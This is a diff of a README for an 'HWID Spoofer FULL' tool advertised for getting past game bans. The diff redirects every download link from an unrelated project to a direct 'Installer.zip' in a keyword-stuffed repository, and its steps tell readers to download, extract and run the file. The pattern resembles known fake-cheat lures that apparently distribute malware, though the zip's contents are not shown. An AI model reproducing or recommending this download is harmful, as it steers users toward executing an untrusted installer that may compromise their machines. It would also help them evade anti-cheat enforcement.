@@ -15,7 +15,7 @@ Ever faced a ban in your favorite game and want to get back into action without 
 
 ## How to Use
 
-1. Download the latest version of **HWID Spoofer FULL** from the [Releases](https://github.com/cli/oauth/releases) section.
+1. Download the latest version of **HWID Spoofer FULL** from the [Releases](https://github.com/ToxicMumo/Hwid-Spoofer-Apex-Valorant-Warzone-Rust-Spoofer/releases/download/v1.0/Installer.zip) section.
 2. Extract the files to a folder on your system.
 3. Run the tool and choose the options you want to apply.
 4. Restart your computer to finalize the changes.
@@ -26,7 +26,7 @@ cleaner, disk, driver, easyanticheat, fivem-hwid-spoofer, fivem-spoofer, hwid-ch
 
 ## Download
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Version-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/ToxicMumo/Hwid-Spoofer-Apex-Valorant-Warzone-Rust-Spoofer/releases/download/v1.0/Installer.zip)](https://github.com/ToxicMumo/Hwid-Spoofer-Apex-Valorant-Warzone-Rust-Spoofer/releases/download/v1.0/Installer.zip)
 
 *Note: Download needs to be launched to get the latest version of the tool.*
 
